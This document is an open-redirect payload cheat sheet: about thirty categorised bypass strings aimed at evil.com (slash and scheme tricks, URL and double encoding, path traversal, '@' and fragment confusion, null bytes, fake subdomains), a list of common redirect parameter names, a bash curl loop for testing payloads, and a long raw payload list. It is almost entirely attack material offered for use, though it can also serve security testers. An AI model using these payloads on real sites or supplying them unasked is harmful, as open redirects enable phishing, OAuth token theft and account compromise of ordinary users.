

##  Protocol & Scheme Tricks
1. `?redirect=//evil.com` (protocol-relative)  
2. `?redirect=https:evil.com` (missing slashes)  
3. `?redirect=http:/evil.com` (single slash)  
4. `?redirect=https:///evil.com` (extra slash)  
5. `?redirect=////evil.com` (multiple slashes)  

---

##  Encoding Tricks
6. `?redirect=%2F%2Fevil.com` (URL-encoded `//`)  
7. `?redirect=%68%74%74%70%3A%2F%2Fevil.com` (fully encoded)  
8. `?redirect=%252F%252Fevil.com` (double-encoded)  
9. `?redirect=%2e%2e%2fevil.com` (encoded `../`)  
10. `?redirect=%2f%2e%2e%2fevil.com` (encoded traversal)  

---

##  Path Traversal Tricks
11. `?redirect=../evil.com`  
12. `?redirect=../../evil.com`  
13. `?redirect=/../../evil.com`  
14. `?redirect=..%2fevil.com` (encoded traversal)  
15. `?redirect=/..%2f..%2fevil.com`  

---

##  Special Character Tricks
16. `?redirect=https://trusted.com@evil.com` (using `@`)  
17. `?redirect=https://evil.com#trusted.com` (fragment abuse)  
18. `?redirect=https://evil.com?trusted.com` (query confusion)  
19. `?redirect=https://evil.com;.trusted.com` (semicolon split)  
20. `?redirect=https://evil.com%00.trusted.com` (null byte injection)  

---

##  Subdomain & DNS Tricks
21. `?redirect=https://evil.com.trusted.com` (fake subdomain)  
22. `?redirect=https://trusted.com.evil.com` (reversed order)  
23. `?redirect=https://trusted.com.evil.com/login`  
24. `?redirect=https://evil.com%2F.trusted.com` (encoded slash)  
25. `?redirect=https://evil.com.trusted.com@real.com` (combo with `@`)  

---

##  Advanced Browser Parsing Tricks
26. `?redirect=https://evil.com%23@trusted.com` (fragment + @)  
27. `?redirect=https://evil.com%3Ftrusted.com` (encoded `?`)  
28. `?redirect=https://evil.com%3Btrusted.com` (encoded `;`)  
29. `?redirect=https://evil.com%2Ctrusted.com` (encoded `,`)  
30. `?redirect=https://evil.com%2F%2E%2E%2Ftrusted.com` (encoded traversal + slash)  

---

## Some Possible parameters

```
?return=
?returnTo=
?return_to=
?checkout_url=
“go”
“return”
“r_url”
“returnUrl”
“returnUri”
“locationUrl”
“goTo”
“return_url”
“return_uri”
“ref=”
“referrer=”
“backUrl”
“returnTo”
“successUrl”
?redir=
redirect_uri=
?redirect_url=
?redirect=
/redirect/
/{payload}
?next=
?url=
?target=
?rurl=
?dest=
?destination=
cgi-bin/redirect.cgi?{}
/out/
/out?
?view=
/login?to=
?image_url=
?go=
```
______________________________________________________________________________________________________________________________________________________

***Something Useful***

```
 for url in $(cat payloads.txt); do 
  echo -n "Testing: $url "
  curl -I -s "$url" | grep -Ei "Location:|HTTP/" | grep -v "200 OK"
done
```
______________________________________________________________________________________________________________________________________________________
***Need Payloads?***
```
//example.com@google.com/%2f..
///google.com/%2f..
////google.com/%2f..
https://google.com/%2f..
/https://google.com/%2f..
//google.com/%2f%2e%2e
//example.com@google.com/%2f%2e%2e
///google.com/%2f%2e%2e
///example.com@google.com/%2f%2e%2e
////google.com/%2f%2e%2e
/http://example.com
/http:/example.com
/https:/%5cexample.com/
/https://%09/example.com
/https://%5cexample.com
/https:///example.com/%2e%2e
/https:///example.com/%2f%2e%2e
/https://example.com
/https://example.com/
/https://example.com/%2e%2e
/https://example.com/%2e%2e%2f
/https://example.com/%2f%2e%2e
/https://example.com/%2f..
/https://example.com//
/https:example.com
/%09/example.com
/%2f%2fexample.com
/%2f%5c%2f%67%6f%6f%67%6c%65%2e%63%6f%6d/
/%5cexample.com
/%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d
/.example.com
//%09/example.com
//%5cexample.com
///%09/example.com
///%5cexample.com
////%09/example.com
////%5cexample.com
/////example.com
/////example.com/
////\;@example.com
////example.com/
//evil.com
https:evil.com
http:/evil.com
https:///evil.com
////evil.com
https://\/\/evil.com
%2F%2Fevil.com
%68%74%74%70%3A%2F%2Fevil.com
%252F%252Fevil.com
%2e%2e%2fevil.com
%2f%2e%2e%2fevil.com
../evil.com
../../evil.com
/../../evil.com
..%2fevil.com
/..%2f..%2fevil.com
https://trusted.com@evil.com
https://evil.com#trusted.com
https://evil.com?trusted.com
https://evil.com;.trusted.com
https://evil.com%00.trusted.com
https://evil.com%0d%0atrusted.com
https://evil.com.trusted.com
https://trusted.com.evil.com
https://evil.com%2F.trusted.com
https://evil.com.trusted.com@real.com
https://evil.com%23@trusted.com
https://evil.com%3Ftrusted.com
https://evil.com%3Btrusted.com
https://evil.com%2Ctrusted.com
https://evil.com%2F%2E%2E%2Ftrusted.com
\/example.com
//%2f%2fexample.com
```
